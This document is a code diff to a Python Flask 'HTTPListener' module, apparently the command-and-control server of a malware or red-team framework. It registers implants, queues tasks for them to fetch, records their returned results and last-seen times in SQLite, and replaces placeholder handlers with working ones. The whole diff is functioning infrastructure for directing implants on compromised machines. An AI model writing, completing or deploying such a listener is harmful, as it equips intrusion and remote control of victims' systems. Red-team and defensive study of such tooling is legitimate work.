@@ -2,11 +2,10 @@ from flask import Flask, request, jsonify, send_file
 from werkzeug.serving import make_server
 import threading, json, datetime, sqlite3
 
-
-
 class HTTPListener:
-    con=0
-    cur=0
+    con = None
+    cur = None
+    
     def __init__(self):
         with open('modules/listeners/HTTP.json') as f:
             cfg = json.load(f)
@@ -15,11 +14,10 @@ class HTTPListener:
         self.port = cfg["port"]
         self.app = Flask(__name__)
         self.server = None
-        self.con = sqlite3.connect(".db")
-        self.cur=self.con.cursor()
-        self.app.add_url_rule('/register','register',self.register, methods=['POST'])
+        self.con = sqlite3.connect(".db", check_same_thread=False)
+        self.cur = self.con.cursor()
+        self.app.add_url_rule('/register', 'register', self.register, methods=['POST'])
         self.app.add_url_rule('/<agent_id>/tasks', 'get_tasks', self.get_tasks, methods=['GET'])
-        self.app.add_url_rule('/<agent_id>/tasks', 'post_tasks', self.post_tasks, methods=['POST'])
         self.app.add_url_rule('/<agent_id>/results', 'post_results', self.post_results, methods=['POST'])
 
     class ServerThread(threading.Thread):
@@ -34,41 +32,95 @@ class HTTPListener:
 
         def shutdown(self):
             self.srv.shutdown()
+
     def update_history(self, agent_id, action_type, content):
-        self.cur.execute("INSERT INTO actions (date, action_type, content, implant_id) VALUES('" + str(datetime.datetime.now()) + "','" + action_type + "','" + content + "','" + agent_id + "');" )
+        self.cur.execute(
+            "INSERT INTO actions (date, action_type, content, implant_id) VALUES (?, ?, ?, ?)",
+            (datetime.datetime.now(), action_type, content, agent_id)
+        )
         self.con.commit()
 
     def get_tasks(self, agent_id):
-        self.cur.execute("""
-            SELECT it.task_id, t.content 
-            FROM implant_task it
-            JOIN tasks t ON it.task_id = t.task_id
-            WHERE it.executed = 0
-            AND it.implant_id = ?
-            ORDER BY it.register_date ASC
-            LIMIT 1
-        """, (agent_id,))
-        task = self.cur.fetchone()
-        if not task:
-            return None
-        task_id, content = task
-        self.update_history(agent_id, "get_task", content)
-        self.cur.execute(
-            "UPDATE implant_task SET executed = 1, completion_date = ? WHERE task_id = ?",
-            (datetime.datetime.now(), task_id)
-        )
-        self.con.commit()
-        return content
-    
-    
-
-    def post_tasks(self, agent_id):
-        return "meowmeowmeowmeow :3"
+        try:
+            self.update_last_seen(agent_id)
+            self.cur.execute("""
+                SELECT it.task_id, t.content 
+                FROM implant_task it
+                JOIN tasks t ON it.task_id = t.id
+                WHERE it.executed = 0
+                AND it.implant_id = ?
+                ORDER BY it.date ASC
+                LIMIT 1
+            """, (agent_id,))  #kill all tuples
+            task = self.cur.fetchone()
+            
+            if not task:
+                return jsonify({"status": "no tasks"}), 200
+                
+            task_id, content = task
+            self.update_history(agent_id, "get_task", content)
+            self.cur.execute(
+                "UPDATE implant_task SET executed = 1, date = ? WHERE task_id = ? AND implant_id = ?",
+                (datetime.datetime.now(), task_id, agent_id)
+            )
+            self.con.commit()
+            return jsonify({"task": content}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
 
     def post_results(self, agent_id):        
-        return "meowmeowmeowmeow :3"
+        try:
+            self.update_last_seen(agent_id)
+            data = request.get_json()
+            if not data or 'result' not in data:
+                return jsonify({"error": "Invalid request"}), 400
+                
+            self.update_history(agent_id, "post_result", data['result'])
+            return jsonify({"status": "result received"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
     
     def register(self):
+        try:
+            implant_data = request.get_json(silent=True)
+            if implant_data is None:
+                return jsonify({"error": "Invalid JSON format"}), 400
+            
+            #parsing the fields dinamically
+            base_fields = {
+                'register_date': datetime.datetime.now(),
+                'last_seen': datetime.datetime.now()
+            }
+            all_fields = {**base_fields, **implant_data}
+            self.cur.execute("PRAGMA table_info(implants)")
+            valid_columns = [col[1] for col in self.cur.fetchall()]
+            filtered_fields = {k: v for k, v in all_fields.items() if k in valid_columns}
+            columns = ', '.join(filtered_fields.keys())
+            placeholders = ', '.join(['?'] * len(filtered_fields))
+            values = list(filtered_fields.values())
+            self.cur.execute(
+                f"INSERT INTO implants ({columns}) VALUES ({placeholders})",
+                values
+            )
+            self.con.commit()
+
+            #get the agent id
+            agent_id = self.cur.lastrowid
+
+            self.update_history(agent_id, "register", "New implant registered")
+            return jsonify({"agent_id": agent_id}), 201
+        
+        except sqlite3.Error as e:
+            return jsonify({"error": f"Database error: {str(e)}"}), 500
+        except Exception as e:
+            return jsonify({"error": f"Unexpected error: {str(e)}"}), 501
+    
+    def update_last_seen(self, agent_id):
+        self.cur.execute(
+            "UPDATE implants SET last_seen = ? WHERE id = ?",
+            (datetime.datetime.now(), agent_id)
+        )
+        self.con.commit()
         return
 
     def start(self):
@@ -83,10 +135,6 @@ class HTTPListener:
             self.server.join()
             self.server = None
             print("[*] HTTP listener stopped")
-    
 
 def module():
-    return HTTPListener();
-
-
-
+    return HTTPListener()
